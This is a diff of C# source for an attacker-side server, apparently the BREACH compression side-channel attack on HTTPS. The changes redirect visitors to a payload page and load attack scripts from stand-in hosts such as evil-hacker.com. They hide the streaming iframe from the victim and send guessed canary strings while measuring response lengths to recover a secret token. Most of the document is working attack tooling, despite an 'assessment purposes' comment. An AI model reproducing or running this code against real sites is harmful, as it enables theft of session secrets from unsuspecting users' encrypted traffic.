@@ -16,10 +16,12 @@ namespace BREACHv3Server
         static String lastAcknowledgedRequest;
 
         static int lastReadDELETEME;
+        static int lastTargetLength;
 
         public static void Listener()
         {
-            Console.WriteLine("BREACH (Port 82) callback is running in its own thread.");
+            Console.WriteLine("BREACH server (Port 81) is running in its own thread.");
+            Console.WriteLine("BREACH callback (Port 82) is running in its own thread.");
             Chilkat.Socket listenSocket2 = SocketUtilities.InitializeSocket(82);
 
             connectedSocket2 = listenSocket2.AcceptNextConnection(60000 * 10);
@@ -106,7 +108,9 @@ namespace BREACHv3Server
                     ResponseBuffer += "@";
                 ResponseBuffer += "-->";
 
-                ResponseBuffer += "<html><head><title>The Tubes Are Strong</title><script src='https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js'></script>";
+                ResponseBuffer += "<html><head><title>The Tubes Are Strong</title>"
+                                  + "<!-- BREACH ATTACK 2013 - Strictly for assessment purposes  - BreachAttack.com -->";
+
                 String myHttpResponse = "HTTP/1.1 200 OK\r\n" +
                                         "Content-Type: text/html; charset=us-ascii\r\n" +
                                         "Server: X-EvilServer\r\n" +
@@ -114,17 +118,42 @@ namespace BREACHv3Server
                                         "Transfer-Encoding: chunked\r\n" +
                                         "\r\n";
 
-                if (myHttpRequest.StartsWith("GET /Payload"))
+
+                // Landing page redirect
+                if (myHttpRequest.StartsWith("GET / HTTP"))
                 {
-                    ResponseBuffer += "<link rel='stylesheet' href='http://www.malbot.net/console.css'>" +
-                        "<script src='http://www.malbot.net/crime.js?" + DateTime.UtcNow.ToFileTimeUtc() + "'></script>" +
+                    String myHttpRedirect = "HTTP/1.1 302 OK\r\n" +
+                                        "Connection: close\r\n" +
+                                        "Location: /Payload\r\n" +
+                                        "\r\n";
+                    success = connectedSocket.SendString(myHttpRedirect);
+                }
+
+                // breach.js 
+                else if (myHttpRequest.StartsWith("GET /breach.js?"))
+                {
+                    String myJS = "HTTP/1.1 200 OK\r\n" +
+                                      "Content-Type: application/javascript\r\n" +
+                                      "Server: X-EvilServer\r\n" +
+                                      "Connection: close\r\n" +
+                                      "Content-Length: " + Constants.breachJS.Length + "\r\n" +
+                                      "\r\n" + Constants.breachJS + "\r\n";
+
+                    success = connectedSocket.SendString(myJS);
+                }
+
+
+                else if (myHttpRequest.StartsWith("GET /Payload"))
+                {
+                    ResponseBuffer += "<link rel='stylesheet' href='http://www.evil-hacker.com/breach/console.css'>" +
                         "</head><body><div id=myDiv style='display:none'>...streaming iFrame goes here</div><br><br><h3> " +
-                        "<div class='container'><section class='editorWrap'><h1 class='animate dropIn'>The BREACH Attack</h1><div class='editor animate fadeIn'>" +
+                        "<div class='container'><section class='editorWrap'><h1 id='breach_title' class='animate dropIn'>The BREACH Attack</h1><div class='editor animate fadeIn'>" +
                         "<div class='menu'></div><div class='code'><textarea id='ta' class='text'>...</textarea></div></div>" +
                         "</section><p>&nbsp;</p></div>" +
-                        "<script src='http://www.malbot.net/animate.js?" + DateTime.UtcNow.ToFileTimeUtc() + "'></script>" +
+                        "<script src='/breach.js?" + DateTime.UtcNow.ToFileTimeUtc() + "'></script>" +
+                        "<script src='http://www.evil-hacker.com/breach/animate.js?" + DateTime.UtcNow.ToFileTimeUtc() + "'></script>" +
 
-                        "<iframe id='myFrame' src='/BackChannel?" + DateTime.UtcNow.ToFileTimeUtc() + "' width=800 height=600 />";
+                        "<iframe style='display:none' id='myFrame' src='/BackChannel?" + DateTime.UtcNow.ToFileTimeUtc() + "' width=800 height=600 />";
 
                     myHttpResponse += ResponseBuffer;
                     myHttpResponse = myHttpResponse.Replace("Transfer-Encoding: chunked", "Content-Length: " + ResponseBuffer.Length);
@@ -134,7 +163,7 @@ namespace BREACHv3Server
                 else if (myHttpRequest.StartsWith("GET /BackChannel"))
                 {
                     // TODO: Hide this DIV
-                    ResponseBuffer += "</head><body><div id=myDiv>...streaming iFrame goes here</div><br><br><h3> ";
+                    ResponseBuffer += "</head><body><div id='myDiv' style='display:none'>...streaming iFrame goes here</div><br><br><h3> ";
 
                     String hexLength = String.Format("{0:X}", ResponseBuffer.Length);
                     ResponseBuffer = hexLength + "\r\n" + ResponseBuffer;
@@ -160,6 +189,7 @@ namespace BREACHv3Server
 
                     HttpGet("Finalize1");
                     HttpGet("Finalize2");
+                    HttpGet("FINISHED:" + knownToken);
 
                     Thread.Sleep(50);
 
@@ -190,7 +220,7 @@ namespace BREACHv3Server
 
         public static void HttpGet(string Canary)
         {
-            String ResponseBuffer = "<script>parent.CorsXHR('" + Canary + "');</script>";
+            String ResponseBuffer = "<script>parent.IssueRequest('" + Canary + "');</script>";
             ResponseBuffer = String.Format("\r\n{0:X}\r\n{1}", ResponseBuffer.Length, ResponseBuffer);
             success = connectedSocket.SendString(ResponseBuffer);
             if (!success)
@@ -493,6 +523,17 @@ namespace BREACHv3Server
 
             if (bytes1 == null || bytes2 == null)
             {
+                WriteConsoleInfo("bytes file reset...");
+
+                // NEW CODE
+                HttpGet("Initialize1");
+                HttpGet("Initialize2");
+                Console.WriteLine("sleeping 1...");
+                Thread.Sleep(1000);
+                File.Delete(@"c:\readBytesRealTime.txt");
+                // END OF NEW CODE
+
+
                 // RETRY 
                 HttpGet(currentCanary + guess + "@" + padding);
                 // This sends a request for a GIF file as well (I Don't think so, triple check)
@@ -521,6 +562,8 @@ namespace BREACHv3Server
         public static int? ReadBytes(string currentCanary, string targetRead)
         {
             int errorCount = 0;
+            int deltaIsTooBigCount = 0;
+
             while (!File.Exists(@"c:\readBytesRealTime.txt"))
             {
                 if (++errorCount % 100 == 0)
@@ -535,6 +578,7 @@ namespace BREACHv3Server
                 {
                     using (StreamReader sr = new StreamReader(File.OpenRead(@"c:\readBytesRealTime.txt")))
                     {
+
                         int allLength = 0;
                         bool readingStarted = false;
                         bool readingComplete = false;
@@ -570,6 +614,7 @@ namespace BREACHv3Server
                                 }
                                 else // delimiter
                                 {
+                                    //if (readingStarted && allLength < 1000) // HACK [ TODO: Sample from initialization ]
                                     if (readingStarted && allLength < 1000) // HACK [ TODO: Sample from initialization ]
                                     {
                                         readingStarted = false;
@@ -589,7 +634,30 @@ namespace BREACHv3Server
                         {
                             if (lastReadDELETEME != 0 && Math.Abs(allLength - lastReadDELETEME) > 5)
                             {
-                                WriteConsoleInfo(allLength + " >><< " + lastReadDELETEME);
+
+                                if (Math.Abs(lastTargetLength - targetRead.Length) > 5)
+                                {
+                                    // Ah! we moved airbags so it's probably good anyways... but maybe WE WANT TO WAIT FOR TWO OR THREE OCCURRENCES
+                                    // JUST IN CASE WE WERE BUFFERING
+                                    WriteConsoleWarning("OVERRIDE?");
+
+                                    lastReadDELETEME = allLength;
+                                    lastTargetLength = targetRead.Length; // ANOTHER CODE CHANGE
+
+                                    return allLength;
+                                }
+
+
+                                if ((deltaIsTooBigCount % 100) == 0)
+                                {
+                                    WriteConsoleInfo(allLength + " >><< " + lastReadDELETEME);
+                                    WriteConsoleInfo(lastTargetLength + " ><>< " + targetRead.Length); // DELETE ME, DEBUG PURPOSES
+                                }
+                                if (++deltaIsTooBigCount > 1000)
+                                {
+                                    WriteConsoleInfo(">>reconnecting<<");
+                                    return null; // this will retry the request
+                                }
 
                                 readingStarted = false;
                                 lastFrameRead = previousLastFrameRead;
@@ -599,6 +667,7 @@ namespace BREACHv3Server
                             }
 
                             lastReadDELETEME = allLength;
+                            lastTargetLength = targetRead.Length; // ANOTHER CODE CHANGE
                             readingComplete = true;
                             return allLength;
                         }
